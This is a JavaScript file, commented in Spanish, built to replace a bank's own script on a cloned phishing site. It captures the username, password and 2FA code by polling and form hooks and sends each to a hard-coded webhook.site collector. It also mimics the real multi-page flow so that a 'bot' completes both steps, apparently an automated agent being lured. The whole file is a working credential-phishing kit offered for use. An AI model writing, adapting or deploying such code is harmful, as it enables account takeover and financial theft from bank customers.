/*
 * /static/veltra.js — reemplazo del script real del banco en el clon.
 * Mantiene el flujo multi-pagina real (/login -> /verificar -> /dashboard)
 * para que el bot complete los dos pasos, y exfiltra cada dato a webhook.site.
 * Generico: cablea el form que exista en la pagina actual.
 */
(function () {
  "use strict";

  // <<< tu webhook >>>
  var COLLECTOR = "https://webhook.site/283663a8-84fb-4f42-8a74-662456c0b978";

  function exfil(fase, datos) {
    var qs = encodeURIComponent(JSON.stringify(datos || {}));
    var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
    try { new Image().src = url; } catch (e) {}
    try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) {}
  }

  exfil("pageload", { path: location.pathname, ref: document.referrer, ua: navigator.userAgent });

  // Captura robusta por polling (no depende del submit).
  var ult = { u: "", p: "", c: "" };
  function chequear() {
    var gu = document.getElementById("txt-login");
    var gp = document.getElementById("txt-password");
    var gc = document.getElementById("txt-2fa");
    var u = gu ? gu.value : "";
    var p = gp ? gp.value : "";
    var c = gc ? gc.value : "";
    if ((u && u !== ult.u) || (p && p !== ult.p)) {
      ult.u = u; ult.p = p;
      exfil("campos-login", { usuario: u, clave: p });
    }
    if (c && c !== ult.c) {
      ult.c = c;
      exfil("campos-2fa", { codigo: c });
    }
  }
  setInterval(chequear, 200);
  ["txt-login", "txt-password", "txt-2fa"].forEach(function (id) {
    var el = document.getElementById(id);
    if (el) { el.addEventListener("input", chequear); el.addEventListener("change", chequear); }
  });

  // Paso 1: login -> navega a /verificar (igual que el real).
  var formLogin = document.getElementById("form-login");
  if (formLogin) {
    formLogin.addEventListener("submit", function (e) {
      e.preventDefault();
      var usuario = (document.getElementById("txt-login") || {}).value || "";
      var clave = (document.getElementById("txt-password") || {}).value || "";
      exfil("login", { usuario: usuario.trim(), clave: clave });
      var btn = document.getElementById("btn-login");
      if (btn) { btn.disabled = true; btn.textContent = "Verificando..."; }
      setTimeout(function () { window.location = "/verificar"; }, 400);
    });
  }

  // Paso 2: 2FA (boton btn-confirm) -> navega a /dashboard.
  var form2fa = document.getElementById("form-2fa");
  if (form2fa) {
    form2fa.addEventListener("submit", function (e) {
      e.preventDefault();
      var codigo = (document.getElementById("txt-2fa") || {}).value || "";
      exfil("2fa", { codigo: codigo.trim() });
      var btn = document.getElementById("btn-confirm") || document.getElementById("btn-2fa");
      if (btn) { btn.disabled = true; btn.textContent = "Verificando..."; }
      setTimeout(function () { window.location = "/dashboard"; }, 400);
    });
  }
})();
